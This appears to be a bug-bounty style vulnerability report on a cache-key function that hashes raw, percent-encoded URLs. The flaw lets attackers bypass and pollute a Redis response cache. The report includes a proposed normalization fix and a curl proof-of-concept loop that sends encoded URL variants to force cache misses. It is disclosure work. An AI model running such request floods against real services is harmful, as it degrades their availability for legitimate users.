### Title
URL Percent-Encoding Inconsistency in `cacheKeyGenerator()` Enables Cache Bypass and Redis Pollution

### Summary
`cacheKeyGenerator()` hashes `req.originalUrl` verbatim without any URL normalization. Because `req.originalUrl` in Express preserves the raw, percent-encoded form of the URL exactly as received, semantically identical requests with different percent-encoding produce different MD5 hashes and therefore different Redis cache keys. An unprivileged attacker can trivially bypass the cache on every request and pollute Redis with duplicate entries by percent-encoding any character in the URL path or query string.

### Finding Description
**Exact code location:** `rest/middleware/responseCacheHandler.js`, `cacheKeyGenerator()`, lines 151–153.

```js
const cacheKeyGenerator = (req) => {
  return crypto.createHash('md5').update(req.originalUrl).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```

`req.originalUrl` in Express.js is the raw URL string as received from the TCP stream. Express does **not** decode percent-encoded characters in `req.originalUrl`. Therefore:

- `GET /api/v1/accounts/0.0.1` → `req.originalUrl = "/api/v1/accounts/0.0.1"` → key = MD5(`/api/v1/accounts/0.0.1`)
- `GET /api/v1/accounts/0%2E0%2E1` → `req.originalUrl = "/api/v1/accounts/0%2E0%2E1"` → key = MD5(`/api/v1/accounts/0%2E0%2E1`)

These are two distinct keys. The backend route handler decodes the path (Node.js HTTP layer decodes path segments before routing), so both requests return identical responses. The cache, however, stores and looks up by the raw-URL-derived key, so the second request always misses.

The developers themselves acknowledge the missing normalization in the comment at line 149:
> *"In the future, this will utilize Edwin's request normalizer (9113)."*

No normalization, canonicalization, or encoding-aware comparison exists anywhere in the cache key pipeline.

**Exploit flow:**
1. A legitimate user requests `/api/v1/accounts/0.0.1` → cache miss → backend processes → response stored under key K1.
2. Attacker requests `/api/v1/accounts/0%2E0%2E1` → key K2 ≠ K1 → cache miss → backend processes again → response stored under key K2.
3. Attacker repeats with `/api/v1/accounts/%30%2e%30%2e%31`, `/%30.%30.%31`, etc. — each variant is a new cache miss and a new Redis entry.
4. Because any ASCII character can be percent-encoded (unreserved characters like `.`, `-`, `_`, `~`, alphanumerics), the attacker has a combinatorial explosion of valid encodings for any URL.

### Impact Explanation
- **Cache bypass**: The attacker can force every single request to bypass the Redis cache and hit the backend database by simply percent-encoding one character in the URL. This defeats the entire purpose of the response cache and increases backend/database load proportionally to attacker request rate.
- **Redis cache pollution**: Each encoding variant creates a separate Redis entry for the same logical resource. An attacker can fill Redis memory with duplicate entries, potentially evicting legitimate cached responses and degrading cache hit rates for normal users.
- **No authentication required**: Any HTTP client can send percent-encoded URLs; no credentials, tokens, or special privileges are needed.

Severity matches the stated scope: griefing/DoS-class with no direct economic damage to end users, but measurable infrastructure impact.

### Likelihood Explanation
Exploitation requires zero privileges and zero specialized knowledge — percent-encoding is a standard HTTP feature documented in RFC 3986. Any HTTP client (curl, browser, script) can send percent-encoded URLs. The attack is trivially repeatable and automatable. The attacker does not need to observe any response or maintain state; they simply send requests with encoded characters.

### Recommendation
Normalize `req.originalUrl` before hashing it in `cacheKeyGenerator()`. The fix should:
1. Decode all percent-encoded characters using `decodeURIComponent` (or a URL-safe equivalent).
2. Re-encode them in a canonical form (e.g., using the WHATWG `URL` API: `new URL(req.originalUrl, 'http://x').pathname + new URL(...).search`).
3. Alternatively, implement the already-planned request normalizer referenced in issue #9113 and use its output as the cache key input.

Example minimal fix:
```js
const cacheKeyGenerator = (req) => {
  const parsed = new URL(req.originalUrl, 'http://placeholder');
  const normalized = parsed.pathname + parsed.search; // WHATWG URL canonicalizes encoding
  return crypto.createHash('md5').update(normalized).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```

### Proof of Concept
```bash
# Step 1: Warm the cache with a normal request
curl -v "https://<mirror-node>/api/v1/accounts/0.0.1"
# Observe: X-Cache: MISS (first request), subsequent requests hit cache

# Step 2: Bypass cache with percent-encoded equivalent
curl -v "https://<mirror-node>/api/v1/accounts/0%2E0%2E1"
# Observe: Cache MISS again — same data returned, different cache key

# Step 3: Enumerate encoding variants to pollute Redis
for path in "0%2E0%2E1" "%30.0.1" "0.%30.1" "0%2e0%2e1" "%30%2e%30%2e%31"; do
  curl -s "https://<mirror-node>/api/v1/accounts/$path" > /dev/null
done
# Result: 5 additional Redis entries created for the same account resource
# Each subsequent attacker request is a guaranteed cache miss, forcing backend DB queries
``` [1](#0-0) [2](#0-1)

### Citations

**File:** rest/middleware/responseCacheHandler.js (L141-153)
```javascript
/*
 * Generate the cache key to access Redis. While Accept-Encoding is specified in the API response Vary
 * header, and therefore that request header value should be used as part of the cache key, the cache
 * implementation stores the response body as the original JSON object without any encoding applied. Thus it
 * is the same regardless of the accept encoding specified, and chosen by the compression middleware.
 *
 * Current key format:
 *
 *   path?query - In the future, this will utilize Edwin's request normalizer (9113).
 */
const cacheKeyGenerator = (req) => {
  return crypto.createHash('md5').update(req.originalUrl).digest('hex') + CACHE_KEY_VERSION_SUFFIX;
};
```
